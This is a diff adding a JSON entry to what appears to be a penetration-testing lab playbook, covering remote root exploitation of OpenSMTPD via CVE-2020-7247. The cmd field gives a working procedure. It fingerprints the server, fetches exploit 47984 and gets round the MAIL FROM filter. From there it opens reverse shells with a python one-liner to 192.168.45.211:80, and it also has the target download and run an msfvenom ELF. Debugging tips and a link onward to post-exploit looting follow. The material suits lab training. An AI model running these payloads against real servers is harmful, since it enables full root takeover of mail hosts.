@@ -1,0 +1,34 @@
+{
+  "id": "opensmtpd_rce",
+  "phase": "RECON",
+  "title": "OpenSMTPD RCE (CVE-2020-7247) → root",
+  "body": "If SMTP on 25 banners as OpenSMTPD (smtp-commands NSE shows 'This is OpenSMTPD'), check the version - anything < 6.6.2 (and the 'uncommented' default config) is vulnerable to CVE-2020-7247. The bug: smtp_mailaddr in smtp_session.c doesn't escape shell metacharacters in the MAIL FROM field, so a crafted address runs arbitrary commands AS ROOT. This is not a foothold-then-privesc box - RCE here IS root, because OpenSMTPD delivers mail as root (you'll see 'Delivered-To: root@host'). Exploit: searchsploit 47984 (CVE-2020-7247). The injection point is MAIL FROM:<;COMMAND;> - and that delivery channel is FILTERED: it rejects shell metacharacters > & | with '503 Unsupported option'. So a raw 'bash -i >& /dev/tcp/..' payload fails at the SMTP layer before it ever runs. Two ways around the filter (below). Confirm egress with a ping first - and note this box family commonly allows outbound on port 80 ONLY, so callbacks to 443/4455/etc silently fail even though execution works.",
+  "cmd": "# ── 1) FINGERPRINT ──\nnmap -p 25 --script smtp-commands $ip      # 'This is OpenSMTPD' + version\n# vulnerable: OpenSMTPD < 6.6.2, uncommented default config -> CVE-2020-7247\n\n# ── 2) GET THE EXPLOIT ──\nsearchsploit -m linux/remote/47984.py      # or 47984.py from exploit-db\n\n# ── 3) PROVE EXECUTION + EGRESS (ping yourself) ──\nsudo tcpdump -i tun0 icmp                  # terminal 1\npython3 47984.py $ip 25 'ping -c 4 192.168.45.211'   # terminal 2\n# ICMP replies = command runs (as root) AND box can reach you. If yes, only the\n# callback step remains. This box family often allows OUTBOUND on port 80 ONLY.\n\n# ══════════════════════════════════════════════════\n# THE FILTER PROBLEM: MAIL FROM rejects  >  &  |\n#   'bash -i >& /dev/tcp/IP/PORT 0>&1' -> 503 Unsupported option &\n# Use a payload with NO shell metacharacters. Two reliable methods:\n# ══════════════════════════════════════════════════\n\n# ── METHOD A: python reverse shell (no >, &, | -- redirection is via os.dup2) ──\n# Callback to 80 (the port this box family allows). Single backslashes \\\" NOT double \\\\\\\".\nnc -lvnp 80\npython3 47984.py $ip 25 'python -c \"import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"192.168.45.211\\\",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\\\"/bin/bash\\\")\"'\n# -> root shell on 80. (os.dup2 does the fd redirection INSIDE python, so the\n#    payload contains no >, &, | for the SMTP filter to choke on.)\n\n# ── METHOD B: staged msfvenom ELF (official-walkthrough method) ──\n# The payload commands (wget / chmod / run) have no metacharacters either.\nmsfvenom -p linux/x64/shell_reverse_tcp -f elf -o shell LHOST=192.168.45.211 LPORT=80\npython3 -m http.server 8000                                  # serve the ELF (any port the box can reach)\npython3 47984.py $ip 25 'wget 192.168.45.211:8000/shell -O /tmp/shell'\npython3 47984.py $ip 25 'chmod +x /tmp/shell'\nnc -lvnp 80                                                  # listener on the allowed port\npython3 47984.py $ip 25 '/tmp/shell'\n# -> root shell on 80.\n\n# ── METHOD C: base64 the metacharacters away (if you must use bash /dev/tcp) ──\n# Even base64 -d | bash reintroduces a pipe; prefer A or B. If you go this route,\n# write the b64 to a file via separate fires, then 'bash /tmp/x' (no pipe inline).\n\n# ── COMMON FAILURES (this exact box) ──\n# 503 Unsupported option &   -> metacharacter hit the SMTP filter; use Method A/B (no >,&,|)\n# payload runs, no shell      -> wrong port. Callback must be 80 on this box family.\n# \\\\\\\" double-backslash       -> over-escaped; use SINGLE backslash \\\" inside the python -c\n# bare 'nc IP 80' connects but dumps mail headers -> nc with no shell attached; use Method A",
+  "warn": "MAIL FROM rejects shell metacharacters (> & |) with '503 Unsupported option' - a raw bash reverse shell fails at the SMTP layer before running. Use the python payload (redirection via os.dup2, no metacharacters) or a staged msfvenom ELF. Egress on this box family is commonly port 80 ONLY - callbacks to other ports silently fail even though the command executes as root. Watch the escaping: SINGLE backslash \\\" inside python -c, not double.",
+  "choices": [
+    {
+      "label": "Got root shell — upgrade the TTY",
+      "next": "shell_upgrade"
+    },
+    {
+      "label": "Host shell + fetch it (curl/wget) — cleaner",
+      "next": "hosted_shell"
+    },
+    {
+      "label": "Shell won't connect — port/encoding debug ladder",
+      "next": "php_webshell"
+    },
+    {
+      "label": "Already root — start post-exploit looting",
+      "next": "linux_post_exploit"
+    },
+    {
+      "label": "Back to SMTP enumeration",
+      "next": "smtp_enum"
+    },
+    {
+      "label": "Back to jump menu",
+      "next": "jump_menu"
+    }
+  ]
+}
